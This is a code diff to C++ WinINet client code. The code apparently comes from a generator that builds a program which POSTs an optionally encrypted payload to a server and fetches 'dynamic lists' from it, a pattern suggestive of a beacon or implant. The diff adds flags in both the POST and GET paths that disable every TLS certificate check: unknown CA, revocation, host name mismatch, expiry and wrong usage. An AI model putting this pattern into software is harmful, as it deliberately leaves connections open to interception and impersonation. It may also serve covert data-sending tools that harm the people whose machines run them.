@@ -1038,9 +1038,20 @@ ${enablePayloadEncryption ? `    // Encrypting Payload before sending
 
         HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", path.c_str(), NULL, NULL, NULL, flags, 0);
         if (!hRequest) {
+            DWORD err = GetLastError();
+            std::stringstream ss;
+            ss << "HttpOpenRequest Error: " << err;
+            g_startupMessage = ss.str();
             InternetCloseHandle(hConnect);
             Sleep(1000);
             continue;
+        }
+
+        DWORD dwFlags = 0;
+        DWORD dwBuffLen = sizeof(dwFlags);
+        if (InternetQueryOptionA(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, &dwBuffLen)) {
+            dwFlags |= SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_REVOCATION | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_WRONG_USAGE;
+            InternetSetOptionA(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags));
         }
 
         BOOL result = HttpSendRequestA(hRequest, headers.c_str(), headers.length(), (LPVOID)payload.c_str(), payload.length());
@@ -1463,6 +1474,12 @@ void FetchDynamicLists() {
 
         HINTERNET hRequest = HttpOpenRequestA(hConnect, "GET", path.c_str(), NULL, NULL, NULL, flags, 0);
         if (hRequest) {
+            DWORD dwFlags = 0;
+            DWORD dwBuffLen = sizeof(dwFlags);
+            if (InternetQueryOptionA(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, &dwBuffLen)) {
+                dwFlags |= SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_REVOCATION | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_WRONG_USAGE;
+                InternetSetOptionA(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags));
+            }
             if (HttpSendRequestA(hRequest, NULL, 0, NULL, 0)) {
                 std::string response;
                 char buffer[1024];
